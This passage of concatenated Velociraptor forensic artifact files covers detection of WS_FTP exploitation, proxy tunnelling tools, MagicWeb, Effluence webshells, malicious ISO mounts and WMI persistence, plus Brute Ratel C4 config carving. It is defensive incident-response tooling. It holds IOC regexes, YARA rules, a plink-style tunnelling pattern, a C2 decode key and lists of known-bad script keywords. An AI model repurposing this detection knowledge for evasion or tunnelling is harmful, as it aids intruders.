   CVE-2023–40044 is a severe .NET deserialization vulnerability in WS_FTP 
   Server’s Ad Hoc Transfer module, allowing a pre-authenticated attacker to 
   execute remote commands on the server’s operating system.   
   
   CVE-2023–42657 is a directory traversal vulnerability, enabling attackers to 
   perform file operations outside their authorized WS_FTP folder path and 
   operate on the underlying OS.   
   
   Both vulnerabilities are critical, with CVSS scores of 8.8 and 9.9 
   respectively, and affect versions prior to 8.7.4 and 8.8.2​.
   
   The artifact enables detection via:
   
   - Yara: IIS logs
   - Evtx: Application Event Logs IIS exception   
   
   Both methods target observed IPs and the string /AHT/AhtApiService.asmx which 
   is part of the vulnerable module.
   Note: no direct evidence of exploitation observed in application logs, only 
   exceptions that otherwise seem rare around the time of exploitation.
   
   
   Last updated: 2023-10-01T13:15Z
   
reference:
  - https://www.rapid7.com/blog/post/2023/09/29/etr-critical-vulnerabilities-in-ws_ftp-server/

type: CLIENT
resources:
  timeout: 1800

parameters:
  - name: EvtxGlob
    default: '%SystemRoot%\System32\Winevt\Logs\Application.evtx'
  - name: IocRegex
    type: regex
    description: "IOC Regex in evtxHunt"
    default: '/AHT/|86\.48\.3\.172'
  - name: DateAfter
    type: timestamp
    default: 1685232000
    description: "Search for events or Modification time after this date. YYYY-MM-DDTmm:hh:ssZ"
  - name: DateBefore
    type: timestamp
    description: "Search for events or Modification time after this date. YYYY-MM-DDTmm:hh:ssZ"
  - name: AllDrives
    type: bool
    description: "By default we target yara at all drives"
    default: Y
  - name: DriveLetter
    description: "Target yara drive. Default is a C: if not AllDrives"
    default: "C:"
  - name: LogYara
    default: |
        rule LOG_ws_ftp_exploit {
          meta:
            description = "Detects potential exploitation of Progress Software WS_FTP Server in IIS logs"
            author = "Matt Green - @mgreen27"
            reference = "https://www.rapid7.com/blog/post/2023/09/29/etr-critical-vulnerabilities-in-ws_ftp-server/"
            date = "2023-10-01"
            score = 80
      
         strings:
           $post = /\n.{1,50} POST \/AHT\/.{1,250}\n/
           $ip = " 86.48.3.172 " ascii
      
          condition:
            any of them
        }
  - name: NumberOfHits
    description: This artifact will stop by default at one hit. This setting allows additional hits
    default: 1
    type: int64
  - name: ContextBytes
    description: Include this amount of bytes around hit as context.
    default: 0
    type: int
  - name: UploadYaraHits
    type: bool

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'
    
    name: Yara
    query: |
      -- check which Yara to use
      LET yara_rules <= LogYara

      -- first find all matching files mft
      LET files = SELECT OSPath, IsDir
        FROM Artifact.Windows.NTFS.MFT(MFTDrive=DriveLetter, AllDrives=AllDrives,
            FileRegex='^u_.+\.log$',
            PathRegex='inetpub' )
        WHERE NOT IsDir
            AND NOT OSPath =~ '''.:\\<Err>\\'''
            AND (FileName=~ '^u_.+\.log$' AND OSPath =~ 'inetpub' )
            AND if(condition=DateAfter,
                then= LastRecordChange0x10 > DateAfter,
                else= True)
            AND if(condition=DateBefore,
                then= LastRecordChange0x10 < DateBefore,
                else= True)

      -- scan files and only report a single hit.
      LET hits = SELECT * FROM foreach(row=files,
            query={
                SELECT
                    FileName, OSPath,
                    File.Size AS Size,
                    File.ModTime AS ModTime,
                    Rule, Tags, Meta,
                    String.Name as YaraString,
                    String.Offset as HitOffset,
                    upload( accessor='scope', 
                            file='String.Data', 
                            name=format(format="%v-%v-%v", 
                            args=[
                                OSPath,
                                if(condition= String.Offset - ContextBytes < 0,
                                    then= 0,
                                    else= String.Offset - ContextBytes),
                                if(condition= String.Offset + ContextBytes > File.Size,
                                    then= File.Size,
                                    else= String.Offset + ContextBytes) ]
                            )) as HitContext
                FROM yara(rules=yara_rules, files=OSPath, context=ContextBytes,number=NumberOfHits)
            })

      -- upload files that have hit
      LET upload_hits=SELECT *,
            upload(file=OSPath) AS Upload
        FROM hits
        GROUP BY OSPath

      -- return rows
      SELECT * FROM if(condition=UploadYaraHits,
        then={ SELECT * FROM upload_hits},
        else={ SELECT * FROM hits})


  - name: Evtx
    query: |
      SELECT EventTime,Computer,Channel,Provider,EventID,EventRecordID,
        EventData,
        OSPath
      FROM Artifact.Windows.EventLogs.EvtxHunter(
                        EvtxGlob=EvtxGlob,
                        IocRegex=IocRegex,
                        IdRegex='^1309$',
                        DateAfter=DateAfter,
                        DateBefore=DateBefore )
      
column_types:
  - name: HitContext
    type: preview_upload
  - name: ModTime
    type: timestamp
  - name: EventTime
    type: timestamp

---END OF FILE---

======
FILE: /content/exchange/artifacts/ProxyHunter.yaml
======
name: Windows.Detection.ProxyHunter
author: Matt Green - @mgreen27
description: |
   This artifact detects evidence of several common proxy tools.
   
   1. Hunt through Event Logs for potential evidence of proxy tool commandline.
   2. Checks active connections for proxy tool commandline (for active threat)
   3. Checks port proxy registry key for OS level forwarding
   
   NOTE: this artifact is Windows only. Similar queries for 2. can be run on linux and macos

type: CLIENT

parameters:
   - name: TargetGlob
     description: Glob target for event log regex search
     default: '%SystemRoot%\\System32\\Winevt\\Logs\\*{Powershell,Security,Sysmon}*.evtx'
   - name: ProxyCliRegex
     type: regex
     description: Regex to detect proxy tool cli. Default example includes plink. 
     default: \d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}:\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}:\d{1,5}\s+-p|\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5} :\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}:socks
sources:
  - precondition:
      SELECT OS From info() where OS = 'windows' 
      
    query: |
      -- firstly hunt through Event Logs for potential evidence of proxy tool commandline
      SELECT EventTime, Computer, Channel, Provider, 
        EventID, EventData, UserData, Message, FullPath
      FROM Artifact.Windows.EventLogs.EvtxHunter(
            IocRegex=ProxyCliRegex,
            EvtxGlob=TargetGlob,
            SearchVSS='Y' )
            
  - name: ActiveConnections
    query: |
      -- Secondly check for proxy CLI with potential active network connections by CLI.
      SELECT * FROM Artifact.Windows.Network.NetstatEnriched(CommandLineRegex=ProxyCliRegex,ProcessNameRegex='.')
      
  - name: PortProxy
    query: |
      -- next we check for Windows inbuilt proxy config usually empty
      SELECT * FROM Artifact.Windows.Registry.PortProxy()

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Detection.Yara.Yara64.yaml
======
name: Windows.Scanner.Yara.Parsed
author: Dennis Yarizadeh + Chris Jones - Check Point Incident Response Team
description: |
    Instructions: Upload a yara signature file (signature file must be named yara.yas) and yara64.exe in a single zip file called yara.zip.
    This artifact is an alternative way to scan processes, or recursively scan the C:\ with a yara file containing multiple yara rules, utilizing the official yara tool. 
    
    This artifact will drop the yara.zip file onto the client in a temporary directory, unzip the binary and yara file, 
    and then iterate through every running process or file on disk. Finally, it will delete the temporary directory.  
    
tools:
  - name: yaraexecutable
    url: https://github.com/VirusTotal/yara/releases/download/v4.3.2/yara-4.3.2-2150-win64.zip
    
parameters:
 - name: ScanType
   description: "Are we scanning Processes?"
   type: bool
   default: Y
   
 - name: ThreadLimit
   description: "How many threads to utilise?"
   type: string
   default: "2"
    
sources:
  - query: |

        LET processes = SELECT * FROM pslist()
        
        LET TmpDir <= tempdir()

        LET YaraExePath <= SELECT FullPath FROM Artifact.Generic.Utils.FetchBinary(ToolName="yaraexecutable", IsExecutable=FALSE, TemporaryOnly=TRUE)

        LET FetchYara <= SELECT * FROM unzip(filename=YaraExePath.FullPath, output_directory=TmpDir)

        -- Set EXE
        LET YaraExe <= TmpDir + '\\yara64.exe'

        -- Set Yara file
        Let YaraFile <= TmpDir + '\\yara.yas'
        
        -- Scan with Yara File
        LET Execute <= SELECT * FROM if (condition=ScanType, then={SELECT * FROM  foreach(row=processes,
        query={
            SELECT Name, Pid, Ppid, Stdout FROM execve(argv=[YaraExe, YaraFile, Pid, "-p", ThreadLimit])
        })},
        
        else = { 
        SELECT Stdout FROM execve(argv=[YaraExe, YaraFile, "-r",  "C:\\", "-g", "-p", ThreadLimit])})
        
        --Read Data
        LET Query = SELECT Stdout FROM Execute
        
        LET ParseLines = SELECT * FROM parse_lines(filename=Query.Stdout, accessor="data")
        
        LET YaraGrok = "%{WORD:category} \\[\\] %{GREEDYDATA:file_path}"
        
        LET ParsedData = SELECT grok(grok=YaraGrok, data=Line) AS Parsed FROM ParseLines
        
        SELECT Parsed.category AS Category, Parsed.file_path AS `File Path` FROM ParsedData

---END OF FILE---

======
FILE: /content/exchange/artifacts/Label.DomainController.yaml
======
name: Label.DomainController
author: Eric Capuano - @eric_capuano
description: |
   This artifact watches for completion of the `watchArtifact`
   and assigns the given `setLabel` if the `WHERE` condition is matched.
   
   Anytime the `Windows.System.Services` hunt is run across the environment,
   results will be interpreted by this server-side artifact.
   
   In this configuration, it will match on all systems running 
   "Active Directory Domain Services" which likely indicates the system
   is a Domain Controller and will label it as such.

type: SERVER_EVENT

parameters:
  - name: setLabel
    default: dc
  - name: watchArtifact
    default: Windows.System.Services

sources:
  - query: |
  
        LET completions = SELECT *
            FROM watch_monitoring(artifact="System.Flow.Completion")
            WHERE Flow.artifacts_with_results =~ watchArtifact

        LET matches = SELECT *, 
            label(client_id=ClientId, labels=setLabel, op="set")
            FROM source(artifact=watchArtifact,
                        client_id=ClientId, flow_id=FlowId)
            WHERE Name = "NTDS" AND DisplayName = "Active Directory Domain Services"
        

        SELECT * FROM foreach(row=completions, query=matches)

---END OF FILE---

======
FILE: /content/exchange/artifacts/MagicWeb.yaml
======
name: Windows.Detection.MagicWeb
author: Matt Green - @mgreen27
description: |
   This artifact will find evidence of NOBELIUM’s MagicWeb.
   
   The artifact consists of two checks:
   
   1. Search for non default PublicKeyToken references in the 
   Microsoft.IdentityServer.Servicehost.exe.config file (31bf3856ad364e35 default).  
   2. Search for untrusted authenticode Microsoft.IdentityServer.*.dll files

reference:
   - https://www.microsoft.com/security/blog/2022/08/24/magicweb-nobeliums-post-compromise-trick-to-authenticate-as-anyone/

parameters:
   - name: ConfigFileGlob
     default: C:\Windows\{AD FS,ADFS}\Microsoft.IdentityServer.Servicehost.exe.config
     description: File names to target
   - name: ExcludeToken
     default: ^31bf3856ad364e35$
     type: regex
     description: Legit tokens to exclude from results
   - name: TargetDllGlob
     default: 'C:\Windows\Microsoft.NET\assembly\**\Microsoft.IdentityServer.*.dll'
   - name: UploadHits
     description: select to upload file hits
     type: bool

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows' 
    query: |
      LET targets = SELECT OSPath,Size,Mtime,Atime,Ctime,Btime
        FROM glob(globs=ConfigFileGlob)

      LET hits = SELECT * FROM foreach(row=targets,
        query={
          SELECT 
            OSPath,Size,
            dict(Mtime=Mtime,Atime=Atime,Ctime=Ctime,Btime=Btime) as Timestamps,
            PublicKeyToken,
            read_file(filename=OSPath) as Data
          FROM  parse_records_with_regex(file=OSPath,regex='PublicKeyToken=(?P<PublicKeyToken>[^,]+),')
          WHERE NOT PublicKeyToken =~ ExcludeToken
          GROUP BY OSPath, PublicKeyToken
        })

      LET upload_hits = SELECT *, upload(file=OSPath) as Upload FROM hits
        
      SELECT *
      FROM if(condition=UploadHits,
        then= upload_hits,
        else= hits )

  - name: BinaryPayload
    description: Searches for untrusted Microsoft.IdentityServer dll files
    query: |
      LET binaries = SELECT 
            OSPath,Size,
            authenticode(filename=OSPath).Trusted as Authenticode,
            dict(Mtime=Mtime,Atime=Atime,Ctime=Ctime,Btime=Btime) as Timestamps,
            parse_pe(file=OSPath) as PE,
            hash(path=OSPath) as Hash
        FROM glob(globs=TargetDllGlob)
        WHERE Authenticode =~ 'untrusted'

      LET upload_binaries = SELECT *, upload(file=OSPath) as Upload FROM binaries
        
      SELECT *
      FROM if(condition=UploadHits,
        then= upload_binaries,
        else= binaries )

---END OF FILE---

======
FILE: /content/exchange/artifacts/Server.Alerts.IRIS.Case.Create.yaml
======
name: Server.Alerts.IRIS.Case.Create
description: |
   Create an IRIS case when monitored artifacts complete with results.  Adds the ClientId, FlowId as tags to the case.  Adds the FQDN as an asset.
  
   Learn more about IRIS, here: https://dfir-iris.org/
  
   It is recommended to use the Server Metadata section to store credentials, instead of having to store directly inside the artifact.

type: SERVER_EVENT

author: Wes Lambert - @therealwlambert

parameters:
  - name: IrisURL
    default:
  - name: IrisKey
    type: string
    description: API key for DFIR-IRIS. Leave blank here if using server metadata store.
    default:
  - name: ArtifactsToAlertOn
    default: .
    type: regex
  - name: DisableSSLVerify
    type: bool
    default: true
  - name: Customer
    default: 1
  - name: SOCId
    default: soc_id_demo
    
sources:
  - query: |
      LET URL <= if(
            condition=IrisURL,
            then=IrisURL,
            else=server_metadata().IrisURL)
      LET Creds = if(
           condition=IrisKey,
           then=IrisKey,
           else=server_metadata().IrisKey)
      LET FlowInfo = SELECT timestamp(epoch=Timestamp) AS Timestamp,
             client_info(client_id=ClientId).os_info.fqdn AS FQDN,
             ClientId, FlowId, Flow.artifacts_with_results[0] AS FlowResults
      FROM watch_monitoring(artifact="System.Flow.Completion")
      WHERE Flow.artifacts_with_results =~ ArtifactsToAlertOn

      LET Cases = SELECT * FROM foreach(row=FlowInfo,
       query={
          SELECT ClientId, FlowId, FQDN, parse_json(data=Content).data.case_id AS CaseID FROM http_client(
          data=serialize(item=dict(
                case_name=format(format="Hit on %v for %v", args=[FlowResults, FQDN]), case_soc_id="soc_id_demo", case_customer=1, case_description=format(format="ClientId: %v\n\nFlowID: %v\n\nURL: %v//app/index.html?#/collected/%v/%v", args=[ClientId, FlowId, config.server_urls[0], ClientId, FlowId,])), format="json"),
          headers=dict(`Content-Type`="application/json", `Authorization`=format(format="Bearer %v", args=[Creds])),
          disable_ssl_security=DisableSSLVerify,
          method="POST",
          url=format(format="%v/manage/cases/add", args=[URL]))
       })
      
      SELECT * from foreach(row=Cases,
        query={
          SELECT * FROM http_client(
            data=serialize(
                item=dict(
                    asset_name=FQDN, 
                    asset_type_id=9, 
                    analysis_status_id=1, 
                    cid=CaseID, 
                    asset_tags=format(format="%v,%v", args=[ClientId, FlowId])
                )
                ,format="json"
            ),
            headers=dict(`Content-Type`="application/json", `Authorization`=format(format="Bearer %v", args=[Creds])),
            disable_ssl_security=DisableSSLVerify,
            method="POST",
            url=format(format="%v/case/assets/add", args=[URL]))
          })

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Detection.ISOMount.yaml
======
name: Windows.Detection.ISOMount
author: Conor Quinn - @ConorQuinn92, updated Matt Green - @mgreen27
description: |
   Following Microsoft's decision to block macros by default on MS Office applications, threat actors are increasingly using container files such as ISO files to distribute malware. 
   This artifact will extract evidence of container files being mounted that may be malicious from the Microsoft-Windows-VHDMP-Operational EventLog. 
   The artifact targets the string ".(iso|vhd|vhdx|img)$" in event IDs: 1 (mount), 2 (unmount) and 12 (type, path, handle).
   
reference:
  - https://nasbench.medium.com/finding-forensic-goodness-in-obscure-windows-event-logs-60e978ea45a3
  - https://www.proofpoint.com/us/blog/threat-insight/how-threat-actors-are-adapting-post-macro-world 

parameters:
   - name: TargetGlob
     default: '%SystemRoot%\System32\Winevt\Logs\Microsoft-Windows-VHDMP-Operational.evtx'
   - name: TargetImageRegex
     default: 'C:\\Users\\.+\.(iso|vhd|vhdx|img)$'
     type: regex
   - name: TargetVSS
     type: bool

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
      SELECT EventTime,
             Computer,
             Username,
             Channel,
             EventID,
             EventRecordID,
             Message,
             EventData,
             regex_replace(source=EventData.VhdFileName, re='''\\\\\?\\''', replace='') AS Filename,
             FullPath
      FROM Artifact.Windows.EventLogs.EvtxHunter(
        EvtxGlob=TargetGlob,
        IdRegex='^(1|2|12|22|23)$',
        SearchVSS=TargetVSS)
        WHERE EventData.VhdFileName =~ TargetImageRegex

    notebook:
      - type: vql_suggestion
        name: ImageMount hunt summary
        template: |
          /*
          # ImageMount hunt summary

          This notebook stacks by Computer and Filename modify as required
          */
          SELECT 
            min(item=EventTime) as EarliestTime,
            max(item=EventTime) as LatestTime,
            Computer, Username, EventID,Message,
            Filename,
            count() as Total
          FROM source(artifact="Exchange.Windows.Detection.ISOMount")
          GROUP BY Computer,Username, EventID, Filename

---END OF FILE---

======
FILE: /content/exchange/artifacts/KACE_SW_Process.yaml
======
name: Windows.Applications.KACE_SW_Process
author:  Matt Green - @mgreen27
description: |
  This artifact parses the KACE software monitoring sqlite database - ksw_process.db
  which provides excellent third party evidence of execution that may 
  be useful during investigation or detection work.  
  
  The artifact can also be modified to target other KACE sqlite databases or set 
  timebounds using stime or etime fields.  
    e.g:    
    `SELECT * FROM process WHERE stime > '2023-01'`   
    `SELECT * FROM process WHERE etime < '2022-12-25'`  
    `SELECT * FROM process WHERE stime > '2023-01' AND etime < '2023-01-06'`     


parameters:
  - name: TargetGlob
    default: C:/ProgramData/Quest/KACE/ksw_process.db
    description: glob of sqlite db to target
  - name: SqlQuery
    description: SQL query to run
    default: |
        SELECT * FROM process
  - name: UserRegex
    description: regex of strings to match in user field
    default: .
    type: regex
  - name: ProcessNameRegex
    description: regex of strings to match in name field
    default: .
    type: regex
  - name: ProcessExclusionRegex
    description: regex of strings to exclude in name field.
    default: 
    type: regex

precondition: SELECT OS From info() where OS = 'windows'

sources:
  - query: |
        -- find files in scope
        LET files = SELECT OSPath FROM glob(globs=TargetGlob)
        
        -- query db and output results
        SELECT * FROM foreach(row=files,
            query={
                SELECT *
                FROM sqlite(
                      file=TargetGlob,
                      query=SqlQuery)
                WHERE   user =~ UserRegex
                    AND name =~ ProcessNameRegex
                    AND NOT if(condition= ProcessExclusionRegex,
                                then= name=~ProcessExclusionRegex,
                                else= False)
            })

---END OF FILE---

======
FILE: /content/exchange/artifacts/EffluenceWebshell.yaml
======
name: Generic.Detection.EffluenceWebshell
author: Matt Green - @mgreen27
description: |
  This artifact detects Effluence Webshell observed deployed during exploitation 
  of Atlassian Confluence CVE-2023-22515.

reference:
    - https://www.aon.com/cyber-solutions/aon_cyber_labs/detecting-effluence-an-unauthenticated-confluence-web-shell/
    
type: CLIENT

parameters:
  - name: ProcessRegex
    default: java
    type: regex
  - name: PidRegex
    default: .
    type: regex
  - name: YaraRule
    type: yara
    default: |
      rule ConfluencePageIndicator {
        meta:
            description = "Detects strings indicative of a web shell in Confluence page"
            author = "Stroz Friedberg"
            date = "2023-11-06"
    
        strings:
            $confluence_title = "<title> - Confluence</title>" ascii wide
            $hide_plugin_function = "hidePlugin(" ascii wide
            $system_plugin_key = "ALWAYS_SYSTEM_PLUGIN_KEYS" ascii wide
            $dashes = " ----- " ascii wide
    
        condition:
            $confluence_title and $hide_plugin_function and $dashes and $system_plugin_key
      }
  - name: NumberOfHits
    description: THis artifact will stop by default at one hit. This setting allows additional hits
    default: 1
    type: int
  - name: ContextBytes
    description: Include this amount of bytes around hit as context.
    default: 0
    type: int64


sources:
  - query: |
      LET linux = SELECT * FROM Artifact.Linux.Detection.Yara.Process(
                            ProcessRegex=ProcessRegex,
                            PidRegex=PidRegex,
                            YaraRule=YaraRule,
                            NumberOfHits=NumberOfHits,
                            ContextBytes=ContextBytes )

      LET windows = SELECT * FROM Artifact.Windows.Detection.Yara.Process(
                            ProcessRegex=ProcessRegex,
                            PidRegex=PidRegex,
                            YaraRule=YaraRule,
                            NumberOfHits=NumberOfHits,
                            ContextBytes=ContextBytes )
        
      LET system = SELECT OS From info() where OS
      
      SELECT * FROM if(condition= system[0].OS=windows,
                        then= windows,
                        else= linux )
                            
column_types:
  - name: HitContext
    type: preview_upload

---END OF FILE---

======
FILE: /content/exchange/artifacts/Generic.Collection.UAC.yaml
======
name: Generic.Collection.UAC
author: Thiago Canozzo Lahr - @tclahr
description: |
    This artifact leverages UAC (Unix-like Artifacts Collector) to collect artifacts
    from Unix-like systems, and then upload the output to the Velociraptor server.

reference:
    - https://github.com/tclahr/uac

type: CLIENT

tools:
    - name: uac
      github_project: tclahr/uac
      github_asset_regex: uac-.+\.tar\.gz

precondition: SELECT OS FROM info() WHERE OS = "darwin" OR OS = "freebsd" OR OS = "linux"

parameters:
    - name: CommandLineOptions
      default: -p ir_triage
      type: string
      description: Command line options.

sources:
    - query: |
        // fetch uac .tar.gz package
        LET uac_package <= SELECT * FROM Artifact.Generic.Utils.FetchBinary(ToolName="uac", IsExecutable=FALSE, TemporaryOnly=TRUE)
        // create temp dir
        LET temp_dir <= tempdir(remove_last=true)
        // uncompress the .tar.gz container
        LET uncompress_tar_gz <= SELECT * FROM execve(argv=['tar', 'zxf', uac_package.OSPath[0]], cwd=temp_dir)
        // search for the correct uac source directory name
        LET uac_source_directory <= SELECT OSPath FROM glob(globs=["uac-*"], root=temp_dir) WHERE IsDir = true
        // run uac
        LET run_uac <= SELECT * FROM execve(argv=[
                                                "/bin/sh",
                                                "-c",
                                                "./uac -u " + CommandLineOptions + " ."
                                            ],
                                            cwd=uac_source_directory.OSPath[0],
                                            sep="\n",
                                            length=2048
                                        )
        // upload output and log file
        LET upload_output_files <= SELECT OSPath, upload(accessor="file", file=OSPath, name=OSPath.Basename) AS Upload FROM glob(globs=["uac-*.log", "uac-*.tar.gz"], root=uac_source_directory.OSPath[0])
        SELECT * FROM chain(
            a=run_uac,
            b=upload_output_files
        )

# CHANGELOG:
# 2023-10-01: v3.0 released
#   - FetchBinary now uses TemporaryOnly=TRUE to use a temporary directory to hold the binary and remove it afterward.
#   - The FullPath column of the Glob plugin is deprecated so it was replaced by OSPath.
# 2023-03-01: v2.0 released
#   - UAC tool needs to be either fetched via upstream URL or manually provided as a .tar.gz package.
# 2023-02-19: v1.0 released
#   - Initial release.

---END OF FILE---

======
FILE: /content/exchange/artifacts/KillProcess.yaml
======
name: Windows.Remediation.KillProcess
author: Matt Green - @mgreen27
description: |
   Quick and dirty monitoring artifact to kill a process by Image Name.
   We monitor the Microsoft-Windows-Kernel-Process ETW provider and leverage 
   taskkill to kill the process.
   
   There are no guardrails on this artifact please be VERY careful adding new entries.

type: CLIENT_EVENT

parameters:
   - name: ProcessToKill
     type: csv
     default: |
        ImageRegex,Description
        \\folder\\folder2\\file\.exe$,Example target image
        \\psexesvc\.exe$,Default psexec executable on target machine.
        \\calc\.exe$,Test fast running process: start > run calc.exe
        \\calculator\.exe$,Test killing calc.exe alias (modern Windows calc.exe)
        

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
      LET name_regex = join(array=ProcessToKill.ImageRegex,sep='|')
      LET watch_processes = SELECT System.TimeStamp AS CreateTime,
                   EventData.ImageName AS ImageName,
                   int(int=EventData.ProcessID) AS Pid,
                   EventData.MandatoryLabel AS MandatoryLabel,
                   EventData.ProcessTokenElevationType AS ProcessTokenElevationType,
                   EventData.ProcessTokenIsElevated AS TokenIsElevated
        FROM watch_etw(guid="{22fb2cd6-0e7b-422b-a0c7-2fad1fd0e716}", any=0x10)
        WHERE System.ID = 1 AND ImageName =~ name_regex
        
      SELECT *, pskill(pid=Pid) as TaskKill
      FROM watch_processes

---END OF FILE---

======
FILE: /content/exchange/artifacts/BRc4.yaml
======
name: Windows.Carving.BRc4
author: Matt Green - @mgreen27
description: |
  This artifact extracts Brute Ratel C4 (BRc4) configuration from a byte stream, 
  process or file on disk. BRc4 is an emerging red-teaming and adversarial 
  attack simulation tool.
  
  The User can define bytes, file glob, process name or pid regex as a target.
  The artifact firstly discovers BruteRatel configuration and extracts bytes, 
  before parsing with Velociraptor Binary Parser.
  
  * BRc4's configuration consits of 8 characters inside several sections. 
  * Character lists reversed in order
  * This list of characters is: either base64 + RC4 encoded or in clear text. 
  
  This content simply carves the configuration and does not unpack files on
  disk. That means pointing this artifact as a packed or obfuscated file may not
  obtain the expected results.

reference:
  - https://unit42.paloaltonetworks.com/brute-ratel-c4-tool/
  - https://github.com/Immersive-Labs-Sec/BruteRatel-DetectionTools
  

parameters:
  - name: TargetBytes
    default:
  - name: TargetFileGlob
    default:
  - name: PidRegex
    default: .
    type: regex
  - name: ProcessRegex
    default: .
    type: regex
  - name: DecodeKey
    default: "bYXJm/3#M?:XyMBF"
  - name: FindConfig
    type: hidden
    description: Final Yara option and the default if no other options provided.
    default: |
        rule BruteRatelConfig
            {
                strings:
                    $config_block = { 50 48 b8 [8] 50 68}
                    $split_marker = { 50 48 b8 [8] 50 48 b8 }
            
                condition:
                    $config_block and #split_marker > 30
            }


sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
      -- dynamic functions to reverse list order
      LET _Reverse(data) = SELECT *, count() as Count FROM foreach(row=data) ORDER BY Count desc
      LET Reverse(data) = _Reverse(data=data)._value

      -- binary parse profile to extract BRc4 configuration. NOTE: need reverse dynamic fuctions above
      LET PROFILE = '''[
                [BRc4Config, 0, [
                    ["__FindConfig",0, "String",{term_hex: "5048b8"}],
                    ["Reversed","x=>len(list=x.__FindConfig) + 3", "String", { term_hex: "5068" }],
                    ["ConfigData",0,"Value",{ "value": "x=>join(array=Reverse(data=split(string=x.Reversed,sep_string=unhex(string='5048b8'))))" }],
                    ["DecodedConfig",0,"Value",{ "value": "x=>crypto_rc4(string=base64decode(string=x.ConfigData),key=DecodeKey)" }],
                    ["Config",0,"Value",{ "value": "x=>if(condition= x.DecodedConfig, then=x.DecodedConfig, else=x.ConfigData)" }],
                ]
            ]]'''
      
      -- Bytes usecase: scan DataBytes for BRc4 config
      LET ByteConfiguration = SELECT
            Rule,
            len(list=TargetBytes) as Size,
            hash(path=TargetBytes,accessor='data') as Hash,
            String.Offset as HitOffset,
            parse_binary(accessor="data",filename=String.Data,profile=PROFILE,struct='BRc4Config').Config as _RawConfig
        FROM yara(
                files=TargetBytes,
                accessor='data',
                rules=FindConfig,
                number=1,
                context=1000
            )
      
      -- Glob usecase: find target files
      LET TargetFiles = SELECT OSPath,Size
        FROM glob(globs=TargetFileGlob) WHERE NOT IsDir

      -- Glob usecase: Extract config from files in scope
      LET FileConfiguration = SELECT * FROM foreach(row=TargetFiles,
            query={
                SELECT 
                    Rule,
                    OSPath, Size,
                    hash(path=OSPath) as Hash,
                    String.Offset as HitOffset,
                    parse_binary(accessor="data",filename=String.Data,profile=PROFILE,struct='BRc4Config').Config as _RawConfig
                FROM yara(
                        files=OSPath,
                        rules=FindConfig,
                        number=1,
                        context=1000
                    )
            })
            
      -- find velociraptor process
      LET me <= SELECT * FROM if(condition= NOT ( TargetFileGlob OR TargetBytes ),
                    then = { SELECT Pid FROM pslist(pid=getpid()) })

      -- find all processes and add filters
      LET processes = SELECT Name as ProcessName, Exe, CommandLine, Pid
        FROM pslist()
        WHERE
            Name =~ ProcessRegex
            AND format(format="%d", args=Pid) =~ PidRegex
            AND NOT Pid in me.Pid
      
      -- scan processes in scope with our rule, limit 1 hit and extract context to parse
      LET ProcessConfiguration = SELECT * FROM foreach(
        row=processes,
        query={
            SELECT
                Rule,
                Pid, ProcessName, CommandLine,
                String.Offset as HitOffset,
                parse_binary(accessor="data",filename=String.Data,profile=PROFILE,struct='BRc4Config').Config as _RawConfig
             FROM yara( 
                    files=format(format="/%d", args=Pid),
                    accessor='process',
                    rules=FindConfig,
                    number=1,
                    context=1000
                )
          })


      -- generate results remove any FPs
      SELECT *,
            { 
                SELECT _value 
                FROM foreach(row=split(string=_RawConfig,sep_string='|')) 
                WHERE _value 
            } as BRc4Config, 
            _RawConfig
      FROM if(condition=TargetBytes,
            then=ByteConfiguration,
            else= if(condition=TargetFileGlob,
                then= FileConfiguration,
                else= ProcessConfiguration))

---END OF FILE---

======
FILE: /content/exchange/artifacts/SuspiciousWMIConsumers.yaml
======
name: Windows.Analysis.SuspiciousWMIConsumers

description: |
  This artifact reports suspicious WMI Event Consumers and their associated Filters
  that may indicate a malicious abuse for persistence.

  NOTE: This artifact uses the same logic as Windows.Persistence.PermanentWMIEvents 
  however, this artifact narrows down the reported results based on a research by SANS.

reference: 
  - https://youtu.be/aBQ1vEjK6v4

author: Amged Wageh - @amgdgocha

parameters:
  - name: AllRootNamespaces
    description: Select to scan all ROOT namespaces. This setting over rides specific namespaces configured below.
    type: bool
  - name: Namespaces
    description: Add a list of target namespaces.
    type: csv
    default: |
       namespace
       root/subscription
       root/default
  - name: InterstingConsumerTypes
    description: A list of the most abused event consumer types.
    type: csv
    default: |
       consumer_types
       ActiveScriptEventConsumer
       CommandLineEventConsumer
  - name: KnownGoodFilters
    description: A list of known good filter names.
    type: csv
    default: |
       filter_name
       BVTFilter
       TSLogonFilter
       RmAssistEventFilter
  - name: KnownGoodConsumers
    description: A list of known good consumer names.
    type: csv
    default: |
       consumer_name
       NTEventLogConsumer
       "SCM Event Log Consumer"
  - name: KnownBadKeywords
    description: A list of known bad keywords.
    type: csv
    default: |
       keyword
       .exe
       .vbs
       .ps1
       .dll
       .eval
       activexobject
       powershell
       commandLinetemplate
       scripttext
       wscript
  - name: KnownGoodKeywords
    description: A list of known good scripts and executables.
    type: csv
    default: |
       keyword
       TSLogonEvents.vbs
       RAevent.vbs
       KernCap.vbs
       WSCEAA.exe
  - name: ScriptingEngines
    description: A list of the ActiveScriptEventConsumer scripting engines.
    type: csv
    default: |
       scripting_engine
       VBScript
       JScript

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
      LET namespaces <= SELECT * FROM if(condition=AllRootNamespaces, 
            then= { 
                SELECT 'root/' + Name as namespace 
                FROM wmi(namespace='ROOT',query='SELECT * FROM __namespace')
                WHERE namespace
            },
            else= Namespaces)

      LET FilterToConsumerBinding <= SELECT * FROM foreach(
            row=namespaces,
            query={
                SELECT parse_string_with_regex(string=Consumer,
                    regex=['((?P<namespace>^[^:]+):)?(?P<Type>.+?)\\.Name="(?P<Name>.+)"']) as Consumer,
                    parse_string_with_regex(string=Filter,regex=['((?P<namespace>^[^:]+):)?(?P<Type>.+?)\\.Name="(?P<Name>.+)"']) as Filter
                FROM wmi(
